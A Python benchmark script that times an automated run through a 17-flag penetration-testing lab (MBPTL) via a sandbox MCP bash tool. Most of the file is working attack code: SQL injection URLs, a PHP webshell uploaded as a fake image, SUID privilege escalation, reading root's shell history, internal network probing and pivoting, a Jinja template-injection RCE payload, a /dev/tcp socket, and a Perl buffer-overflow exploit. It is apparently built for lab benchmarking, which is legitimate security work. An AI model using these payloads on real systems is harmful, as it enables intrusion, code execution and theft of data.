#!/usr/bin/env python3
"""Portal 5 — MBPTL CTF Benchmark.

Times each attack phase of the Most Basic Penetration Testing Lab (17-flag CTF)
through the sandbox MCP (portal5-sandbox at :8914). Measures real-world attack
latency end-to-end: web exploitation, SQLi, post-exploitation, pivoting, and
binary exploitation.

Phases benchmarked:
  recon       HTML comment + HTTP header + port 8080 (Flags 1-3)
  web_enum    Admin panel discovery (Flag 4)
  sqli        Error-based SQLi + sqlmap dump + admin login (Flags 5-7)
  postexploit Webshell upload + user.txt + root.txt via SUID bahs (Flags 8-9)
  soc         Apache log + bash_history + bashrc via webshell (Flags 10-12)
  pivot       Internal mbptl-app SSTI + flags 13-14 via webshell tunnel
  binary      Binary download + nc banner + buffer overflow shell (Flags 15-17)

Usage:
    python3 tests/benchmarks/bench_mbptl.py
    python3 tests/benchmarks/bench_mbptl.py --phases recon web_enum sqli
    python3 tests/benchmarks/bench_mbptl.py --runs 3
    python3 tests/benchmarks/bench_mbptl.py --output results/bench_mbptl.json
    python3 tests/benchmarks/bench_mbptl.py --dry-run

Requires:
    LAB_MBPTL_HOST set in .env or environment
    MBPTL containers running (./launch.sh lab-mbptl OR docker compose --profile lab-mbptl up -d)
    mcp-sandbox container running (:8914)
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
import time
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import httpx

_ROOT = Path(__file__).resolve().parents[2]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

RESULTS_DIR = Path(__file__).parent / "results"


# ── Env ───────────────────────────────────────────────────────────────────────


def _load_env() -> None:
    env_file = _ROOT / ".env"
    if env_file.exists():
        for line in env_file.read_text().splitlines():
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, _, v = line.partition("=")
                os.environ.setdefault(k.strip(), v.strip())


_load_env()

SANDBOX_PORT = int(os.environ.get("SANDBOX_HOST_PORT", "8914"))
HOST = os.environ.get("LAB_MBPTL_HOST", "")
WEB_PORT = int(os.environ.get("LAB_MBPTL_PORT_WEB", "80"))
ADMIN_PORT = int(os.environ.get("LAB_MBPTL_PORT_ADMIN", "8080"))
MBPTL_LXC_VMID = os.environ.get("LAB_MBPTL_LXC_VMID", "")

PROXMOX_MCP_PORT = int(os.environ.get("PROXMOX_MCP_HOST_PORT", "8927"))

ADMIN_USER = "admin"
ADMIN_PASS = "P@ssw0rd!"

ALL_PHASES = ["recon", "web_enum", "sqli", "postexploit", "soc", "pivot", "binary"]

_SHELL_PATH: str = ""


# ── MCP calls ─────────────────────────────────────────────────────────────────


def _mcp_call(code: str, timeout: int = 120, dry_run: bool = False) -> dict[str, Any]:
    if dry_run:
        return {"ok": True, "output": "[dry-run]", "elapsed_s": 0.0}

    base = f"http://localhost:{SANDBOX_PORT}/mcp"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    t0 = time.monotonic()

    with httpx.Client(timeout=timeout + 30) as c:
        sid = ""
        with c.stream(
            "POST",
            base,
            headers=hdrs,
            json={
                "jsonrpc": "2.0",
                "id": 1,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "clientInfo": {"name": "bench_mbptl", "version": "1"},
                },
            },
        ) as r:
            r.raise_for_status()
            sid = r.headers.get("mcp-session-id", "")
            for _ in r.iter_lines():
                pass

        call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs

        last_result: dict = {}
        with c.stream(
            "POST",
            base,
            headers=call_hdrs,
            json={
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {"name": "execute_bash", "arguments": {"code": code, "timeout": timeout}},
            },
        ) as r:
            r.raise_for_status()
            for line in r.iter_lines():
                line = line.strip()
                if not line.startswith("data:"):
                    continue
                payload = line[5:].strip()
                if not payload:
                    continue
                try:
                    obj = json.loads(payload)
                    if "result" in obj or "error" in obj:
                        last_result = obj
                except json.JSONDecodeError:
                    pass

    elapsed = time.monotonic() - t0
    content = last_result.get("result", {}).get("content", [{}])
    text = content[0].get("text", "") if content else ""
    error = last_result.get("error")
    ok = error is None and bool(text)
    return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}


def _proxmox_mcp_call(
    tool_name: str, arguments: dict[str, Any], timeout: int = 180
) -> dict[str, Any]:
    base = f"http://localhost:{PROXMOX_MCP_PORT}/mcp"
    hdrs = {"Content-Type": "application/json", "Accept": "application/json, text/event-stream"}
    t0 = time.monotonic()

    with httpx.Client(timeout=timeout + 30) as c:
        sid = ""
        with c.stream(
            "POST",
            base,
            headers=hdrs,
            json={
                "jsonrpc": "2.0",
                "id": 1,
                "method": "initialize",
                "params": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "clientInfo": {"name": "bench_mbptl", "version": "1"},
                },
            },
        ) as r:
            r.raise_for_status()
            sid = r.headers.get("mcp-session-id", "")
            for _ in r.iter_lines():
                pass

        call_hdrs = {**hdrs, "mcp-session-id": sid} if sid else hdrs
        last_result: dict = {}
        with c.stream(
            "POST",
            base,
            headers=call_hdrs,
            json={
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {"name": tool_name, "arguments": arguments},
            },
        ) as r:
            r.raise_for_status()
            for line in r.iter_lines():
                line = line.strip()
                if not line.startswith("data:"):
                    continue
                payload = line[5:].strip()
                if not payload:
                    continue
                try:
                    obj = json.loads(payload)
                    if "result" in obj or "error" in obj:
                        last_result = obj
                except json.JSONDecodeError:
                    pass

    elapsed = time.monotonic() - t0
    error = last_result.get("error")
    content = last_result.get("result", {}).get("content", [{}])
    text = content[0].get("text", "") if content else json.dumps(last_result.get("result", {}))
    ok = error is None
    return {"ok": ok, "output": text, "elapsed_s": round(elapsed, 2), "error": error}


# ── Flag extraction ───────────────────────────────────────────────────────────


def _extract_flags(text: str, numbers: list[int]) -> list[str]:
    found = []
    for n in numbers:
        m = re.search(rf"MBPTL-{n}\{{[^}}]+\}}", text)
        if m:
            found.append(m.group())
    return found


# ── Phase definitions ─────────────────────────────────────────────────────────


def _phase_recon(dry_run: bool) -> dict:
    code = f"""
F1=$(curl -s "http://{HOST}:{WEB_PORT}/" | grep -o 'MBPTL-1{{[^}}]*}}')
F2=$(curl -sI "http://{HOST}:{WEB_PORT}/" | grep -i 'X-MBPTL:' | grep -o 'MBPTL-2{{[^}}]*}}')
F3=$(curl -s "http://{HOST}:{ADMIN_PORT}/" | grep -o 'MBPTL-3{{[^}}]*}}')
echo "F1=$F1"
echo "F2=$F2"
echo "F3=$F3"
"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [1, 2, 3])
    ok = len(flags) == 3
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/3 flags found"}


def _phase_web_enum(dry_run: bool) -> dict:
    code = f"""
F4=$(curl -s "http://{HOST}:{ADMIN_PORT}/administrator/" | grep -o 'MBPTL-4{{[^}}]*}}')
echo "F4=$F4"
"""
    r = _mcp_call(code, timeout=30, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [4])
    ok = len(flags) == 1
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/1 flags found"}


def _phase_sqli(dry_run: bool) -> dict:
    code = f"""
F5=$(curl -s "http://{HOST}:{WEB_PORT}/detail.php?id=1%27" | grep -o 'MBPTL-5{{[^}}]*}}')
echo "F5=$F5"

F6=$(curl -s "http://{HOST}:{WEB_PORT}/detail.php?id=999%20UNION%20SELECT%201,flag,NULL,NULL,NULL%20FROM%20administrator.flag--+-" \
  | grep -o 'MBPTL-6{{[^}}]*}}')
echo "F6=$F6"

curl -s -c /tmp/mbptl_cook.txt -b /tmp/mbptl_cook.txt \
  -d "username={ADMIN_USER}&password=P%40ssw0rd%21" \
  "http://{HOST}:{ADMIN_PORT}/administrator/" > /tmp/mbptl_login.html

F7=$(curl -s -c /tmp/mbptl_cook.txt -b /tmp/mbptl_cook.txt \
  "http://{HOST}:{ADMIN_PORT}/administrator/admin.php" \
  | grep -o 'MBPTL-7{{[^}}]*}}')
echo "F7=$F7"
"""
    r = _mcp_call(code, timeout=150, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [5, 6, 7])
    ok = len(flags) == 3
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/3 flags found"}


def _phase_postexploit(dry_run: bool) -> dict:
    global _SHELL_PATH
    code = f"""
python3 - <<'PYEOF'
import subprocess, re, urllib.parse

HOST = "{HOST}"
ADMIN_PORT = {ADMIN_PORT}
WEB_PORT = {WEB_PORT}

subprocess.run([
    "curl", "-s", "-c", "/tmp/mbptl_cook.txt", "-b", "/tmp/mbptl_cook.txt",
    "-d", "username=admin&password=P%40ssw0rd%21",
    f"http://{{HOST}}:{{ADMIN_PORT}}/administrator/",
], capture_output=True, timeout=15)

with open("/tmp/s.php", "w") as f:
    f.write("<?php system($_GET['cmd']); ?>")

subprocess.run([
    "curl", "-s", "-c", "/tmp/mbptl_cook.txt", "-b", "/tmp/mbptl_cook.txt",
    "-F", "title=x", "-F", "author=x", "-F", "year=2024", "-F", "synopsis=x",
    "-F", "image=@/tmp/s.php;type=image/jpeg;filename=s.php",
    f"http://{{HOST}}:{{ADMIN_PORT}}/administrator/admin.php",
], capture_output=True, timeout=15)

# Find highest book id (shell was just added as newest book)
idx_r = subprocess.run(
    ["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"],
    capture_output=True, text=True, timeout=15,
)
ids = re.findall(r"detail\\.php\\?id=(\\d+)", idx_r.stdout)
last_id = max(int(i) for i in ids) if ids else 1

detail_r = subprocess.run(
    ["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/detail.php?id={{last_id}}"],
    capture_output=True, text=True, timeout=15,
)
m = re.search(r'http://[^"]+:(\\d+)/(administrator/uploads/\\S+\\.php)', detail_r.stdout)
if not m:
    print("SHELL_NOT_FOUND")
    raise SystemExit(1)

shell_port = int(m.group(1))
shell_path = m.group(2)
print(f"SHELL={{shell_path}}")

shell_url = f"http://{{HOST}}:{{shell_port}}/{{shell_path}}"
with open("/tmp/mbptl_shell_url.txt", "w") as f:
    f.write(shell_url)

def webshell(cmd):
    url = f"{{shell_url}}?cmd={{urllib.parse.quote(cmd)}}"
    r = subprocess.run(["curl", "-s", url], capture_output=True, text=True, timeout=30)
    return r.stdout

f8 = webshell("cat /flag/user.txt")
print(f"F8={{f8.strip()}}")

f9 = webshell("echo 'cat /flag/root.txt' | /bin/bahs")
print(f"F9={{f9.strip()}}")
PYEOF
"""
    r = _mcp_call(code, timeout=90, dry_run=dry_run)
    out = r["output"]

    shell_m = re.search(r"SHELL=(administrator/uploads/\S+\.php)", out)
    if shell_m and not dry_run:
        _SHELL_PATH = shell_m.group(1)
    elif re.search(r"SHELL=\S+", out) and not dry_run:
        _SHELL_PATH = re.search(r"SHELL=(\S+)", out).group(1)

    flags = _extract_flags(out, [8, 9])
    ok = len(flags) == 2
    shell_note = f" shell={_SHELL_PATH}" if _SHELL_PATH else " shell=MISSING"
    return {
        **r,
        "ok": ok,
        "flags_found": flags,
        "shell_path": _SHELL_PATH,
        "detail": f"{len(flags)}/2 flags found{shell_note}",
    }


def _phase_soc(dry_run: bool) -> dict:
    code = f"""
python3 - <<'PYEOF'
import subprocess, re, urllib.parse

HOST = "{HOST}"
WEB_PORT = {WEB_PORT}
ADMIN_PORT = {ADMIN_PORT}

# Discover webshell URL from latest book detail page (ephemeral sandbox — no /tmp persistence)
_idx = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"], capture_output=True, text=True, timeout=15)
_ids = re.findall(r"detail\\.php\\?id=(\\d+)", _idx.stdout)
_last_id = max(int(i) for i in _ids) if _ids else 1
_det = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/detail.php?id={{_last_id}}"], capture_output=True, text=True, timeout=15)
_ms = re.search(r'http://[^"]+:(\\d+)/(administrator/uploads/\\S+\\.php)', _det.stdout)
if not _ms:
    print("NO_SHELL_PATH")
    raise SystemExit(1)
shell_url = f"http://{{HOST}}:{{_ms.group(1)}}/{{_ms.group(2)}}"

def webshell(cmd, timeout=30):
    url = f"{{shell_url}}?cmd={{urllib.parse.quote(cmd)}}"
    r = subprocess.run(["curl", "-s", "--max-time", str(timeout), url], capture_output=True, text=True, timeout=timeout+5)
    return r.stdout

f10_raw = webshell("echo 'cat /var/log/apache2/access.log' | /bin/bahs")
m10 = re.search(r"MBPTL-10{{[^}}]+}}", f10_raw)
print("F10=" + (m10.group() if m10 else "NOT_FOUND"))

f11_raw = webshell("echo 'cat /root/.bash_history' | /bin/bahs")
m11 = re.search(r"MBPTL-11{{[^}}]+}}", f11_raw)
print("F11=" + (m11.group() if m11 else "NOT_FOUND"))

f12_raw = webshell("echo 'cat /root/.bashrc' | /bin/bahs")
m12 = re.search(r"MBPTL-12{{[^}}]+}}", f12_raw)
print("F12=" + (m12.group() if m12 else "NOT_FOUND"))
PYEOF
"""
    r = _mcp_call(code, timeout=90, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [10, 11, 12])
    ok = len(flags) == 3
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/3 flags found"}


def _phase_pivot(dry_run: bool) -> dict:
    code = f"""
python3 - <<'PYEOF'
import subprocess, re, urllib.parse

HOST = "{HOST}"
WEB_PORT = {WEB_PORT}
ADMIN_PORT = {ADMIN_PORT}

_idx = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"], capture_output=True, text=True, timeout=15)
_ids = re.findall(r"detail\\.php\\?id=(\\d+)", _idx.stdout)
_last_id = max(int(i) for i in _ids) if _ids else 1
_det = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/detail.php?id={{_last_id}}"], capture_output=True, text=True, timeout=15)
_ms = re.search(r'http://[^"]+:(\\d+)/(administrator/uploads/\\S+\\.php)', _det.stdout)
if not _ms:
    print("NO_SHELL_PATH")
    raise SystemExit(1)
shell_url = f"http://{{HOST}}:{{_ms.group(1)}}/{{_ms.group(2)}}"

def webshell(cmd, timeout=30):
    url = f"{{shell_url}}?cmd={{urllib.parse.quote(cmd)}}"
    r = subprocess.run(["curl", "-s", "--max-time", str(timeout), url], capture_output=True, text=True, timeout=timeout+5)
    return r.stdout

# mbptl-app is on Docker bridge with mbptl-main — hardcoded /24, no DNS in container
# Use webshell to find the app IP by probing the bridge range
app_ip_raw = webshell(
    "for h in $(seq 1 10); do curl -s --max-time 1 http://172.18.0.$h:5000/ | grep -q MBPTL-13 && echo 172.18.0.$h && break; done"
)
app_ip = app_ip_raw.strip() or "172.18.0.4"

f13_raw = webshell(f"curl -s --max-time 5 http://{{app_ip}}:5000/")
m13 = re.search(r"MBPTL-13{{[^}}]+}}", f13_raw)
print("F13=" + (m13.group() if m13 else "NOT_FOUND"))

# SSTI RCE via webshell: URL-encode the template injection for the inner curl call
# webshell() URL-encodes the outer command; the inner URL needs its own encoding
ssti_raw = '{{{{request.application.__globals__.__builtins__.__import__("os").popen("cat /flag.txt").read()}}}}'
ssti_enc = urllib.parse.quote(ssti_raw)
f14_raw = webshell(f'curl -s "http://{{app_ip}}:5000/?name={{ssti_enc}}"')
m14 = re.search(r"MBPTL-14{{[^}}]+}}", f14_raw)
print("F14=" + (m14.group() if m14 else "NOT_FOUND"))
PYEOF
"""
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [13, 14])
    ok = len(flags) == 2
    return {**r, "ok": ok, "flags_found": flags, "detail": f"{len(flags)}/2 flags found"}


def _phase_binary(dry_run: bool) -> dict:
    import base64 as _b64
    import struct as _struct

    _bof = b"A" * 136 + _struct.pack("<Q", 0x4006C6)
    _bof_hex = _bof.hex()
    # Perl exploit script (base64-encoded to avoid quoting issues in webshell)
    _perl = (
        "use IO::Socket::INET;\n"
        'my $s=IO::Socket::INET->new(PeerAddr=>"172.18.0.3",PeerPort=>31337,Proto=>"tcp") or die $!;\n'
        "$s->autoflush(1);\n"
        "my $r; $s->recv($r,512);\n"
        f'my $p=pack("H*","{_bof_hex}");\n'
        'print $s $p."\\ncat /flag.txt\\ncat /flag16.txt\\n";\n'
        "sleep(2);\n"
        "$s->recv($r,4096);\n"
        "print $r;\n"
    )
    _perl_b64 = _b64.b64encode(_perl.encode()).decode()

    code = f"""
python3 - <<'PYEOF'
import subprocess, re, urllib.parse, base64

HOST = "{HOST}"
WEB_PORT = {WEB_PORT}
ADMIN_PORT = {ADMIN_PORT}

_idx = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/"], capture_output=True, text=True, timeout=15)
_ids = re.findall(r"detail\\.php\\?id=(\\d+)", _idx.stdout)
_last_id = max(int(i) for i in _ids) if _ids else 1
_det = subprocess.run(["curl", "-s", f"http://{{HOST}}:{{WEB_PORT}}/detail.php?id={{_last_id}}"], capture_output=True, text=True, timeout=15)
_ms = re.search(r'http://[^"]+:(\\d+)/(administrator/uploads/\\S+\\.php)', _det.stdout)
shell_url = f"http://{{HOST}}:{{_ms.group(1)}}/{{_ms.group(2)}}" if _ms else ""

def webshell(cmd, timeout=30):
    if not shell_url:
        return ""
    url = f"{{shell_url}}?cmd={{urllib.parse.quote(cmd)}}"
    r = subprocess.run(["curl", "-s", "--max-time", str(timeout), url],
                       capture_output=True, timeout=timeout+5)
    return r.stdout.decode('utf-8', errors='replace')

subprocess.run([
    "curl", "-s", "-o", "/tmp/mbptl-bin",
    f"http://{{HOST}}:{{ADMIN_PORT}}/administrator/main",
], capture_output=True, timeout=30)
# F15: flag stored as consecutive movabs $imm64 immediates in .text — scan ELF directly
# (avoids objdump cross-arch issue: sandbox runs ARM64, binary is x86-64)
import struct as _struct
with open("/tmp/mbptl-bin", "rb") as _bf:
    _elf = _bf.read()
_f15_text = ""
_i = 0
while _i < len(_elf) - 9:
    # x86-64 movabs $imm64,reg: REX.W (0x48/0x49) + opcode B8-BF + 8-byte LE immediate
    if _elf[_i] in (0x48, 0x49) and 0xB8 <= _elf[_i+1] <= 0xBF:
        _raw = _elf[_i+2:_i+10]
        if all(0x20 <= b < 0x7f for b in _raw):
            _f15_text += _raw.decode('ascii')
        _i += 10
    else:
        _i += 1
if "MBPTL-15" in _f15_text and "}}" not in _f15_text[_f15_text.find("MBPTL-15"):]:
    _f15_text += "0}}"  # trailing 0x7d30 stored as separate movq
m15 = re.search(r"MBPTL-15{{[^}}]+}}", _f15_text)
print("F15=" + (m15.group() if m15 else "NOT_FOUND"))

f16_raw = webshell(
    '''bash -c '(echo; sleep 1) | timeout 4 bash -c "exec 3<>/dev/tcp/172.18.0.3/31337; cat <&3" 2>&1' '''
)
m16 = re.search(r"MBPTL-16{{[^}}]+}}", f16_raw)
print("F16=" + (m16.group() if m16 else "NOT_FOUND"))

# Upload Perl exploit via base64 to avoid quoting/binary issues
PERL_B64 = "{_perl_b64}"
webshell(f"echo {{PERL_B64}} | base64 -d > /tmp/mbptl_bof.pl")
f17_raw = webshell("perl /tmp/mbptl_bof.pl", timeout=30)
m17 = re.search(r"MBPTL-17{{[^}}]+}}", f17_raw)
print("F17=" + (m17.group() if m17 else "NOT_FOUND"))
print(f"BOF_OUTPUT={{f17_raw[:300]}}")
PYEOF
"""
    r = _mcp_call(code, timeout=120, dry_run=dry_run)
    out = r["output"]
    flags = _extract_flags(out, [15, 16, 17])
    ok = len(flags) == 3
    bof_ran = "BOF_OUTPUT=" in out
    detail = f"{len(flags)}/3 flags found" + (" BOF_RAN" if bof_ran else "")
    return {**r, "ok": ok, "flags_found": flags, "detail": detail}


PHASE_FNS = {
    "recon": _phase_recon,
    "web_enum": _phase_web_enum,
    "sqli": _phase_sqli,
    "postexploit": _phase_postexploit,
    "soc": _phase_soc,
    "pivot": _phase_pivot,
    "binary": _phase_binary,
}

PHASE_FLAGS = {
    "recon": [1, 2, 3],
    "web_enum": [4],
    "sqli": [5, 6, 7],
    "postexploit": [8, 9],
    "soc": [10, 11, 12],
    "pivot": [13, 14],
    "binary": [15, 16, 17],
}


# ── Lab lifecycle ─────────────────────────────────────────────────────────────

MBPTL_SNAPSHOT = os.environ.get("LAB_MBPTL_SNAPSHOT", "clean")


def lab_setup(dry_run: bool = False, snapshot: str = "") -> bool:
    if not MBPTL_LXC_VMID:
        print("  [proxmox-mcp] lifecycle skipped — LAB_MBPTL_LXC_VMID not set")
        return True
    snap = snapshot or MBPTL_SNAPSHOT
    print(f"\n── Lab Setup (Proxmox MCP :{PROXMOX_MCP_PORT}) ──")
    if dry_run:
        print(f"  DRY-RUN — would revert vmid={MBPTL_LXC_VMID} to snapshot={snap!r} then start")
        return True
    try:
        # Revert to clean snapshot first — ensures repeatable state
        print(f"  reverting vmid={MBPTL_LXC_VMID} → snapshot={snap!r} ...", end=" ", flush=True)
        r = _proxmox_mcp_call(
            "proxmox_rollback_snapshot",
            {"vmid": int(MBPTL_LXC_VMID), "snapname": snap},
            timeout=120,
        )
        if not r["ok"]:
            print(f"WARN: revert failed ({r.get('error')}) — continuing with current state")
        else:
            print("OK")

        # Start the container
        print(f"  starting vmid={MBPTL_LXC_VMID} ...", end=" ", flush=True)
        r = _proxmox_mcp_call(
            "proxmox_container_start",
            {"vmid": int(MBPTL_LXC_VMID), "wait": True},
            timeout=60,
        )
        if not r["ok"]:
            print(f"FAIL: {r.get('error')}")
            return False
        print("OK")
        print("  waiting 15s for MBPTL containers to settle ...", end=" ", flush=True)
        time.sleep(15)
        print("ok")
        return True
    except Exception as exc:
        print(f"ERR: {exc}")
        return False


def lab_revert(dry_run: bool = False, snapshot: str = "") -> None:
    """Revert LXC to clean snapshot after a bench run for repeatability."""
    if not MBPTL_LXC_VMID:
        return
    snap = snapshot or MBPTL_SNAPSHOT
    print(
        f"\n── Lab Teardown — reverting vmid={MBPTL_LXC_VMID} → {snap!r} ...", end=" ", flush=True
    )
    if dry_run:
        print("DRY-RUN")
        return
    try:
        # Stop containers first so Docker state is clean on next start
        _proxmox_mcp_call(
            "proxmox_container_exec",
            {
                "vmid": int(MBPTL_LXC_VMID),
                "command": "docker compose -f /opt/ctf-labs/mbptl/mbptl/docker-compose.yml down 2>/dev/null; true",
            },
            timeout=30,
        )
        _proxmox_mcp_call("proxmox_container_stop", {"vmid": int(MBPTL_LXC_VMID)}, timeout=30)
        r = _proxmox_mcp_call(
            "proxmox_rollback_snapshot",
            {"vmid": int(MBPTL_LXC_VMID), "snapname": snap},
            timeout=120,
        )
        print("OK" if r.get("ok") else f"WARN: {r.get('error')}")
    except Exception as exc:
        print(f"ERR: {exc}")


# ── Runner ────────────────────────────────────────────────────────────────────


def run_bench(
    phases: list[str],
    runs: int,
    dry_run: bool,
    output_path: Path | None,
    manage_lifecycle: bool = False,
    snapshot: str = "",
) -> None:
    ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
    results: dict[str, Any] = {
        "bench": "mbptl",
        "started_at": ts,
        "host": HOST,
        "web_port": WEB_PORT,
        "admin_port": ADMIN_PORT,
        "dry_run": dry_run,
        "runs": runs,
        "total_flags": 17,
        "phases": {},
    }

    total_t0 = time.monotonic()
    print(f"\nPortal 5 — MBPTL CTF Bench  [{ts}]")
    print(f"HOST={HOST}  WEB_PORT={WEB_PORT}  ADMIN_PORT={ADMIN_PORT}")
    print(f"runs={runs}  dry_run={dry_run}")
    print(f"Phases: {', '.join(phases)}\n")

    if manage_lifecycle:
        if not lab_setup(dry_run=dry_run, snapshot=snapshot):
            print("[!] Lab setup failed — aborting")
            return

    for phase in phases:
        fn = PHASE_FNS[phase]
        timings: list[float] = []
        ok_count = 0
        all_flags: list[str] = []
        last_result: dict = {}
        for run_n in range(1, runs + 1):
            # Revert to clean snapshot between runs for repeatability
            if manage_lifecycle and run_n > 1:
                lab_setup(dry_run=dry_run, snapshot=snapshot)

            print(f"  [{phase}] run {run_n}/{runs} ...", end=" ", flush=True)
            result = fn(dry_run)
            timings.append(result["elapsed_s"])
            if result.get("ok"):
                ok_count += 1
            for f in result.get("flags_found", []):
                if f not in all_flags:
                    all_flags.append(f)
            last_result = result
            status = "OK" if result.get("ok") else "FAIL"
            print(f"{status}  {result['elapsed_s']:.1f}s  {result.get('detail', '')}")

        avg = sum(timings) / len(timings) if timings else 0.0
        results["phases"][phase] = {
            "runs": runs,
            "ok": ok_count,
            "fail": runs - ok_count,
            "elapsed_s": {"min": min(timings), "max": max(timings), "avg": round(avg, 2)},
            "flags_found": all_flags,
            "flags_expected": PHASE_FLAGS[phase],
            "detail": last_result.get("detail", ""),
        }
        if not last_result.get("ok") and not dry_run:
            print(f"\n  [!] Last output:\n{last_result.get('output', '')[-800:]}\n")

    total_elapsed = time.monotonic() - total_t0
    results["total_elapsed_s"] = round(total_elapsed, 1)
    results["finished_at"] = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")

    all_found: list[str] = []
    for pr in results["phases"].values():
        all_found.extend(pr.get("flags_found", []))
    results["flags_found_total"] = len(set(all_found))
    results["flags_found"] = sorted(set(all_found))

    print(
        f"\n{'Phase':<14} {'OK':>4} {'Fail':>4} {'Avg(s)':>8} {'Min':>6} {'Max':>6}  {'Flags':>6}  Detail"
    )
    print("─" * 80)
    for phase, pr in results["phases"].items():
        e = pr["elapsed_s"]
        nf = len(pr.get("flags_found", []))
        ne = len(pr.get("flags_expected", []))
        print(
            f"{phase:<14} {pr['ok']:>4} {pr['fail']:>4}"
            f" {e['avg']:>8.1f} {e['min']:>6.1f} {e['max']:>6.1f}"
            f" {nf:>3}/{ne:<2}  {pr['detail']}"
        )
    print(f"\nTotal: {total_elapsed:.1f}s  Flags: {results['flags_found_total']}/17")

    out = output_path or RESULTS_DIR / f"bench_mbptl_{ts}.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(results, indent=2))
    print(f"Results → {out}")

    if manage_lifecycle:
        lab_revert(dry_run=dry_run, snapshot=snapshot)

    if not dry_run and any(pr["fail"] > 0 for pr in results["phases"].values()):
        sys.exit(1)


# ── CLI ───────────────────────────────────────────────────────────────────────


def _parse() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    p.add_argument(
        "--phases",
        nargs="+",
        choices=ALL_PHASES,
        default=ALL_PHASES,
        help="phases to run (default: all)",
    )
    p.add_argument("--runs", type=int, default=1, help="repetitions per phase")
    p.add_argument("--output", type=Path, help="JSON results file path")
    p.add_argument("--dry-run", action="store_true", help="skip MCP calls, measure overhead only")
    p.add_argument(
        "--lifecycle",
        action="store_true",
        help="Start MBPTL LXC via Proxmox MCP before bench, revert after (requires LAB_MBPTL_LXC_VMID)",
    )
    p.add_argument(
        "--snapshot",
        default="",
        metavar="NAME",
        help="Proxmox snapshot to revert to before each run (default: LAB_MBPTL_SNAPSHOT env or 'clean')",
    )
    p.add_argument(
        "--revert-only",
        action="store_true",
        help="Just revert the LXC to the clean snapshot and exit — useful for manual reset",
    )
    return p.parse_args()


if __name__ == "__main__":
    args = _parse()

    if args.revert_only:
        lab_revert(dry_run=args.dry_run, snapshot=args.snapshot)
        sys.exit(0)

    if not HOST and not args.dry_run:
        print("ERROR: LAB_MBPTL_HOST not set. Set it in .env or environment.")
        sys.exit(1)
    run_bench(
        args.phases,
        args.runs,
        args.dry_run,
        args.output,
        manage_lifecycle=args.lifecycle,
        snapshot=args.snapshot,
    )
